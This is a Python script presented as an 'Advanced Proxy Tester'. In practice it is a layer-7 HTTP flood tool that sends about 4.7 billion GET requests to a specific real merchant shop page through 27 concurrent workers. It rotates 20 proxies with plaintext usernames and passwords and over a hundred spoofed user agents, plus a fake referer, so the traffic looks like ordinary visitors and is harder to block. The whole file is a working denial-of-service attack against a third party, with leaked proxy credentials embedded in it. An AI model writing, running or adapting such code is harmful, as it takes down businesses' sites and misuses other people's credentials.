#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import random
from collections import defaultdict
import json
import threading
from datetime import datetime

# Updated Proxy configuration with new credentials
PROXIES = [
    # First set of proxies (wgudzqmo:hz0x33e0x4tz)
    {"http": "http://wgudzqmo:hz0x33e0x4tz@198.23.239.134:6540"},
    {"http": "http://wgudzqmo:hz0x33e0x4tz@207.244.217.165:6712"},
    {"http": "http://wgudzqmo:hz0x33e0x4tz@107.172.163.27:6543"},
    {"http": "http://wgudzqmo:hz0x33e0x4tz@23.94.138.75:6349"},
    {"http": "http://wgudzqmo:hz0x33e0x4tz@216.10.27.159:6837"},
    {"http": "http://wgudzqmo:hz0x33e0x4tz@136.0.207.84:6661"},
    {"http": "http://wgudzqmo:hz0x33e0x4tz@64.64.118.149:6732"},
    {"http": "http://wgudzqmo:hz0x33e0x4tz@142.147.128.93:6593"},
    {"http": "http://wgudzqmo:hz0x33e0x4tz@104.239.105.125:6655"},
    {"http": "http://wgudzqmo:hz0x33e0x4tz@173.0.9.70:5653"},
    
    # Second set of proxies (ktbbgbys:j8x13f6is5mn)
    {"http": "http://ktbbgbys:j8x13f6is5mn@198.23.239.134:6540"},
    {"http": "http://ktbbgbys:j8x13f6is5mn@207.244.217.165:6712"},
    {"http": "http://ktbbgbys:j8x13f6is5mn@107.172.163.27:6543"},
    {"http": "http://ktbbgbys:j8x13f6is5mn@23.94.138.75:6349"},
    {"http": "http://ktbbgbys:j8x13f6is5mn@216.10.27.159:6837"},
    {"http": "http://ktbbgbys:j8x13f6is5mn@136.0.207.84:6661"},
    {"http": "http://ktbbgbys:j8x13f6is5mn@64.64.118.149:6732"},
    {"http": "http://ktbbgbys:j8x13f6is5mn@142.147.128.93:6593"},
    {"http": "http://ktbbgbys:j8x13f6is5mn@104.239.105.125:6655"},
    {"http": "http://ktbbgbys:j8x13f6is5mn@173.0.9.70:5653"}
]

TARGET_URL = "https://shop.zatiqeasy.com/merchant/118404"
TOTAL_REQUESTS = 4715426784
MAX_WORKERS = 27  # Optimal concurrency level
TIMEOUT = (3.0, 7)  # Connect timeout 3s, read timeout 7s
RETRY_COUNT = 1  # Quick retry for failed requests
REQUEST_DELAY = 0.1  # Small delay between requests

# Enhanced User-Agents (124 total) with more mobile devices
USER_AGENTS = [
    # Chrome Windows (40 versions)
    *[f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36" 
      for v in range(90, 130)],
    
    # Firefox (30 versions)
    *[f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{v}.0) Gecko/20100101 Firefox/{v}.0" 
      for v in range(90, 120)],
    
    # Safari Mac (20 versions)
    *[f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{v}.0 Safari/605.1.15" 
      for v in range(13, 33)],
    
    # Mobile Devices (34 versions)
    *[f"Mozilla/5.0 (iPhone; CPU iPhone OS {v}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{v}.0 Mobile/15E148 Safari/604.1" 
      for v in range(12, 20)],
    *[f"Mozilla/5.0 (Linux; Android {v}; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.0.0 Mobile Safari/537.36" 
      for v in range(10, 14)],
    *[f"Mozilla/5.0 (Linux; Android {v}; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.0.0 Mobile Safari/537.36" 
      for v in range(10, 12)]
]

class AdvancedProxyTester:
    def __init__(self):
        self.start_time = time.time()
        self.stats = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'errors': defaultdict(int),
            'proxy_stats': defaultdict(lambda: {'success': 0, 'failed': 0}),
            'active_workers': 0,
            'start_time': datetime.now().isoformat()
        }
        
        # Configure session for maximum performance
        self.session = requests.Session()
        self.session.trust_env = False  # Ignore system proxies
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=MAX_WORKERS,
            pool_maxsize=MAX_WORKERS,
            max_retries=1
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

    def make_request(self, request_num):
        proxy = random.choice(PROXIES)
        proxy_ip = proxy['http'].split('@')[1].split(':')[0]
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Referer': 'https://www.google.com/'
        }
        
        for attempt in range(RETRY_COUNT + 1):
            try:
                start_time = time.time()
                response = self.session.get(
                    TARGET_URL,
                    proxies=proxy,
                    headers=headers,
                    timeout=TIMEOUT,
                    allow_redirects=False
                )
                elapsed = time.time() - start_time
                
                if response.status_code == 200:
                    with threading.Lock():
                        self.stats['proxy_stats'][proxy_ip]['success'] += 1
                    return request_num, True, elapsed, None
                else:
                    error_msg = f"HTTP_{response.status_code}"
                    if attempt == RETRY_COUNT:
                        with threading.Lock():
                            self.stats['proxy_stats'][proxy_ip]['failed'] += 1
                        return request_num, False, elapsed, error_msg
                    
            except Exception as e:
                error_msg = type(e).__name__
                if attempt == RETRY_COUNT:
                    with threading.Lock():
                        self.stats['proxy_stats'][proxy_ip]['failed'] += 1
                    return request_num, False, 0, error_msg
                
            time.sleep(REQUEST_DELAY)  # Small delay before retry

    def update_stats(self, request_num, success, elapsed, error=None):
        with threading.Lock():
            self.stats['total'] += 1
            if success:
                self.stats['success'] += 1
            else:
                self.stats['failed'] += 1
                self.stats['errors'][error] += 1
            
            # Update display every 10 requests
            if request_num % 10 == 0 or request_num == TOTAL_REQUESTS:
                self.display_progress(request_num)

    def display_progress(self, current):
        elapsed = time.time() - self.start_time
        req_per_sec = current / elapsed if elapsed > 0 else 0
        success_rate = (self.stats['success'] / current * 100) if current > 0 else 0
        
        print(
            f"\r🚀 Progress: {current}/{TOTAL_REQUESTS} | "
            f"✅ {self.stats['success']} | "
            f"❌ {self.stats['failed']} | "
            f"📈 {success_rate:.1f}% | "
            f"⚡ {req_per_sec:.1f} req/sec | "
            f"Workers: {self.stats['active_workers']}/{MAX_WORKERS}",
            end='', flush=True
        )

    def run(self):
        print(f"🔥 Starting Advanced Proxy Tester 🔥")
        print(f"🎯 Target URL: {TARGET_URL}")
        print(f"🔄 {len(PROXIES)} proxies available")
        print(f"👤 {len(USER_AGENTS)} user agents")
        print(f"⚡ {MAX_WORKERS} concurrent workers | {TOTAL_REQUESTS} total requests")
        
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {}
            
            # Submit initial batch of requests
            for i in range(1, min(MAX_WORKERS * 2, TOTAL_REQUESTS) + 1):
                future = executor.submit(self.make_request, i)
                futures[future] = i
                self.stats['active_workers'] += 1
            
            # Process completed futures and submit new ones
            next_request = len(futures) + 1
            while futures:
                done, _ = concurrent.futures.wait(
                    futures, timeout=0.1,
                    return_when=concurrent.futures.FIRST_COMPLETED
                )
                
                for future in done:
                    request_num = futures.pop(future)
                    self.stats['active_workers'] -= 1
                    
                    try:
                        request_num, success, elapsed, error = future.result()
                        self.update_stats(request_num, success, elapsed, error)
                        
                        # Submit new request if we have more to do
                        if next_request <= TOTAL_REQUESTS:
                            new_future = executor.submit(self.make_request, next_request)
                            futures[new_future] = next_request
                            self.stats['active_workers'] += 1
                            next_request += 1
                            
                    except Exception as e:
                        self.update_stats(request_num, False, 0, "FutureError")
        
        self.show_final_results()

    def show_final_results(self):
        duration = time.time() - self.start_time
        req_per_sec = self.stats['total'] / duration
        success_rate = (self.stats['success'] / self.stats['total']) * 100
        
        print("\n\n📊 FINAL TEST RESULTS")
        print("="*50)
        print(f"⏱️  Total Duration: {duration:.2f} seconds")
        print(f"📊 Total Requests: {self.stats['total']}")
        print(f"✅ Successful: {self.stats['success']}")
        print(f"❌ Failed: {self.stats['failed']}")
        print(f"📈 Success Rate: {success_rate:.1f}%")
        print(f"⚡ Requests/sec: {req_per_sec:.1f}")
        
        # Proxy performance summary
        print("\n🔧 PROXY PERFORMANCE")
        print("="*50)
        for proxy_ip, stats in sorted(
            self.stats['proxy_stats'].items(),
            key=lambda x: x[1]['success'],
            reverse=True
        ):
            total = stats['success'] + stats['failed']
            rate = (stats['success'] / total * 100) if total > 0 else 0
            print(f"{proxy_ip}: {stats['success']}/{total} ({rate:.1f}%)")
        
        # Error summary
        if self.stats['errors']:
            print("\n🔴 ERROR SUMMARY (Top 10)")
            print("="*50)
            for error, count in sorted(
                self.stats['errors'].items(),
                key=lambda x: x[1],
                reverse=True
            )[:10]:
                print(f"- {error}: {count}")
        
        # Save results to JSON
        result_data = {
            "configuration": {
                "target_url": TARGET_URL,
                "total_requests": TOTAL_REQUESTS,
                "max_workers": MAX_WORKERS,
                "proxies_used": len(PROXIES),
                "user_agents_used": len(USER_AGENTS),
                "timeout_seconds": TIMEOUT
            },
            "results": {
                "duration_seconds": round(duration, 2),
                "requests_per_second": round(req_per_sec, 1),
                "success_count": self.stats['success'],
                "failure_count": self.stats['failed'],
                "success_rate_percent": round(success_rate, 1),
                "proxy_performance": {
                    ip: dict(stats) for ip, stats in self.stats['proxy_stats'].items()
                },
                "error_distribution": dict(self.stats['errors'])
            }
        }
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxy_test_{timestamp}.json"
        with open(filename, 'w') as f:
            json.dump(result_data, f, indent=2)
        
        print(f"\n📄 Full results saved to: {filename}")

if __name__ == "__main__":
    import concurrent.futures
    
    tester = AdvancedProxyTester()
    try:
        tester.run()
    except KeyboardInterrupt:
        print("\n🛑 Testing interrupted by user")
    except Exception as e:
        print(f"\n💥 Critical error: {str(e)}")